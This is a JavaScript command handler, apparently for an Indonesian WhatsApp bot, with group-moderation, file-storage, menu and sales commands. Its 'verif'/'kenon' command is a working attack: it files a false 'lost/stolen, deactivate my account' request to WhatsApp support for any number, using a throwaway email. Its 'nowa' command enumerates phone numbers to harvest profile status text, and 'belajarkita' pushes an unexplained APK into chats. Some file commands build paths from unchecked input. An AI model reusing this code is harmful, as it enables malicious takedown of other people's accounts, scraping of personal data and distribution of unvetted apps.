if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
     if (args[0] === 'open'){
await haikal.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
     } else if (args[0] === 'close'){
await haikal.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
     } else {
     let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
    ]
    await haikal.sendButtonText(from, buttons, `Mode Edit Info`, haikal.user.name, m)

    }
    }
    break
//=================================================//
    case 'join': {
    if (!isCreator) return m.reply(mess.owner)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
m.reply('Sabar Cuy Loading')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await haikal.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
    }
    break
//=================================================//
case 'setppbot': {
if (!isCreator) return m.reply(mess.owner)
m.reply('Sabar Cuy Loading')
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await haikal[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./baseikal/lib/myfunc');var {img}=await generateProfilePicture(media);await haikal[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await haikal[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid','success','downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
m.reply('Sabar Cuy Loading')
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await haikal['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./baseikal/lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await haikal[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await haikal['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess['success']);}catch{m['reply'](_0x3c52ee(0x7d));}
}
break
//=================================================//
case 'block': {
if (!isCreator) return m.reply(mess.owner)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return m.reply(mess.owner)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setname': case 'setsubject': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text ?'
await haikal.groupUpdateSubject(from, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setdesc': case 'setdesk': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text Nya ?'
await haikal.groupUpdateDescription(from, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break

//=================================================//
case 'once': case 'toonce': { 
if (!isCreator) return m.reply(mess.owner)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(from, {image: {url: anu},viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(from, {video: {url: anu},viewOnce : true},{quoted: m })
}
}
break
//=================================================//
case 'ss': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
haikal.sendMessage(from, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted:m }).catch((err) => m.reply(jsonformat('*LINK NYA SLUR*')))
}
break
//=================================================//
case 'searchgroups':
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
m.reply(res)
});
break
//=================================================//
case 'kick': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//

case 'add': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(from, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

//=================================================//
case 'setcmd': {
if (!isCreator) return m.reply(mess.owner)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return m.reply(mess.owner)
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
m.reply(`Done!`)
}
break
//=================================================//
case 'public': {
if (!isCreator) return m.reply(mess.owner)
haikal.public = true
m.reply('Sukse Change To Public')
}
break
//=================================================//
case 'self': {
if (!isCreator) return m.reply(mess.owner)
haikal.public = false
m.reply('Sukses Change To Self')
}
break
case 'listcmd': {
if (!isCreator) return m.reply(mess.owner)
let teks = `
*List Cmd Sticker*
${Object.entries(global.db.data.sticker).map(([key, value], index) => `True : ${value.text}`).join('\n')}
`.trim()
haikal.sendText(from, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'antilink': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'addprem':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await haikal.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Nomor ${bnnd} Telah Sudah Premium!!!`)
break
case 'delprem':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
yaki = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
m.reply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
break
case 'listprem':
teksooo = '*List Owner*\n\n'
for (let i of owner) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${owner.length}*`
haikal.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": owner } })
break
//=================================================//
//=================================================//
case 'owner': case 'crator':{
haikal.sendContact(from, global.owner, m)
}
break
//=================================================//
case 'menu': {
m.reply(`*Selamat ${salam} kak ${pushname}*
command : ${prefix}
Status : ${isCreator ? 'Owner' : 'User'}
Runtime Bot : ${runtime(process.uptime())}
${menu}`)
}
break
case 'allmenu': {
m.reply(`*Selamat ${salam} kak ${pushname}*
command : ${prefix}
Status : ${isCreator ? 'Premium' : 'User'}
Runtime Bot : ${runtime(process.uptime())}
${allmenu}`)
}
break
case 'textmaker': {
m.reply(`*Selamat ${salam} kak ${pushname}*
command : ${prefix}
Status : ${isCreator ? 'Owner' : 'User'}
Runtime Bot : ${runtime(process.uptime())}
${textmaker}`)
}
break
//=================================================/
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
haikal.sendImage(from, data.url, 'Success Coy', m)
})
break
case 'jadian': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤
@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(from, buttonMessage, {mentions: menst})
}
break

//=================================================//
case 'verif': case 'kenon': {
if (!isCreator) return m.reply(mess.owner)
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hilang/Dicuri: Mohon nonaktifkan akun saya")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19382.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006861186")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
haikal.sendMessage(from, { text: util.format(res.data)}, { quoted:m })
}
break
//=================================================//
//=================================================//
case 'panel': {
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

*Pricelist Harga AmGeekz Panel* :

⚡PAKET G1
1GB RAM/1GB Disk/25% CPU
Rp10.000,00/1 BULAN
⚡PAKET G2
2GB RAM/2GB Disk/50% CPU
Rp15.000,00/1 BULAN
⚡PAKET G3
3GB RAM/3GB Disk/75% CPU
Rp20.000,00/1 BULAN
⚡PAKET G4
4GB RAM/4GB Disk/100% CPU
Rp25.000,00/1 BULAN
⚡PAKET G5
5GB RAM/5GB Disk/125% CPU
Rp30.000,00/1 BULAN
⚡PAKET G6
6GB RAM/6GB Disk/150% CPU
Rp35.000.00/1 BULAN
⚡PAKET G7
7GB RAM/7GB Disk/175% CPU
Rp40.000.00/1 BULAN

---------------------------------------
Pricelist Perpanjang Masa Aktif AmGeekz Panel :

⚡PAKET G1 = Rp5.000
⚡PAKET G2 = Rp7.500
⚡PAKET G3 = Rp10.000
⚡PAKET G4 = Rp12.500
⚡PAKET G5 = Rp15.000
⚡PAKET G6 = Rp17.500
⚡PAKET G7 = Rp20.000

Nb:
Melakukan top up saldo artinya anda setuju dengan segala kebijakan kami.
Untuk pricelist renew berlaku jika ada server yg masih aktif di dalam akun minimal selama 23hari.

*[ Administrator]*
contact.amgeekz.site
Admin1 = 6281717802873
Admin2 = 6281717802873
Admin3 = 6281717802873
`)
}
break
//=================================================//



case 'pdana': {
haikal.sendMessage(from, { image: dana,  caption: `DANA : 6281717802873` }, { quoted:m })
}
break
case 'pgopay': {
haikal.sendMessage(from, { image: gopay,  caption: `GOPAY : 6281717802873` }, { quoted:m })
}
break
case 'pbca': {
haikal.sendMessage(from, { image: rekening,  caption: `Rek BCA : 2832657396` }, { quoted:m })
}
break
//=================================================//

case 'tutorial': {
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Tutorial Run Via Panel
https://youtu.be/rqqxkI4P8YY`)
}
break
//=================================================//
case 'belajarkita': {
if (!isCreator) return m.reply(mess.owner)
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Ah3W96XRKFP1U7LSM1DvTeP81MpC75EBgDUYYQt9B5mF.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Belajar Bersama_1.11.apk",
"fileSha256": "PdBsdG3dTVg+CAiJJzqlcU/Wc1DHAloGQKV0n5vo30s=",
"fileLength": "7249993",
"pageCount": 0,
"mediaKey": "wnhI3PodfZqLKQbbEBQFYBxlb7n1WBhwWbPfuPQJm/8=",
"fileName": "Belajar Bersama_1.11.apk",
"fileEncSha256": "LAmKijY7XCKJrONV0cBXPiCNVYJdYLMjMOsi+q4pd2g=",
"directPath": "/v/t62.7119-24/34960356_543134977691326_1792059771773909536_n.enc?ccb=11-4&oh=01_AdQHN60wPp2-oLvINncKbeOse99hDWzyfjN2G4S0G4kr1g&oe=63C591FA",
"mediaKeyTimestamp": "1671207354",
"caption": "Hallo Kak Aplikasi Ini Adalah Buatan Asli Hw Mods Aman Dan Terpercaya Selamat Belajar ❤️",
}
}), { userJid: from })
haikal.relayMessage(from, document.message, { messageId: document.key.id })
sticSukses(from)
}
break
//=================================================//
case 'infoamgeekz': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

📮 _*Syarat & Ketentuan*_

1. _Fitur lupa password sudah bisa digunakan jadi pastikan email aktif kalian sudah di tambahkan di panel kami._
2. _Selalu backup data_
3. _Jangan beritahukan user password kepada orang lain ( kami tidak bertanggung jawab dengan hal ini )_

_*sebelumnya kami mengalami kasus dimana user kami menjual akunnya ke orang lain dan selang beberapa hari meminta kami untuk reset password hal ini membuat nama panel kami dibilang scam untuk menanggulangi hal ini kami tidak akan lagi membantu melakukan reset password.*` , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
case 'redemcode': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `*CARA MASUKAN KODE REDDEM AMGEEKZ*
- _TEKAN ICON KOIN/SALDO DIATAS_
- _PILIH KODE REDDEM_
- _MASUKAN KODE YANG DI KIRIM ADMIN_
- _TEKAN REDDEM_

*CREATE SERVER DI AMGEEKZ PANEL*
- _TEKAN POJOK KIRI ATAS_
- _PILIH SERVER_
- _TEKAN CREATE SERVER_
- _MASUKAN NAMA_
- _SOFTWARE/GAMES : NODEJS_
- _SPECIFICATION : NODEJS_
- _NODE : PILIH SERVER YANG DI INGINKAN_
- _PILIH PAKET_
- _TEKAN MANAGE_` , mentions: participants.map(a => a.id)}, { quoted:m })
}
break

//=================================================//
case 'bagaimanakah':
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted:m })
break
//=================================================//
 case 'apakah':
 if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted:m })
break
//=================================================//
case 'nowa': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return m.reply('lah?')
m.reply('Sabar Cuy Loading')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await haikal.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await haikal.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
m.reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
//=================================================//
case 'addpdf':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Nama pdf apa')
let teks = `${q}`
{
if (docunye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./database/Docu/${teks}.pdf`)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Masukan query')
let teks = `${q}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break
case 'listpdf': {
if (!isCreator) return m.reply(mess.owner)
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf Haikal + sambil reply pesan target* \n\n Contoh 2 : yopdf Haikal`
m.reply(teksoooo)
}
break
case 'yopdf':{
if (!isCreator) return m.reply(mess.owner)
let teks = `${q}`
{
haikal.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break

case 'sendpdf': {
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
let teks = `${q}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
m.reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'larangan': case 'peraturan': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `Haii 👋 Aku Shekai Bot Hw Mods
Aku Sebagai Admin Akan Melarang Kalian Untuk Toxic Ataupun Berkata Kasar Di group Ini !!!

Larangan !!!
fuck
ajg
anjing
ngentod
bangsat
bgst` , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
case 'fuck': case 'ajg': case 'ngentod': case 'bangsat': case'anjing': case'babi': {
if (!m.isGroup) return m.reply('Jangan Toxic Coy Kalau Di group Dah Ku Kick Anjay')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
kicee = m.sender
await haikal.groupParticipantsUpdate(from, [kicee], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
haikal.sendMessage(from, {text:`「 Detect Toxic 」\n\n@${kicee.split("@")[0]} Telah dikick karena Telah Toxic di group ini`, contextInfo:{mentionedJid:[kicee]}}, {quoted:m})
}
break
case 'addzip':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Nama zip apa')
let teks = `${q}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await haikal.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./database/zip/${teks}.zip`)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${q}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./database/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break
case 'listzip': {
if (!isCreator) return m.reply(mess.owner)
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
teksooooo += `│⭔ ${x}\n`
}
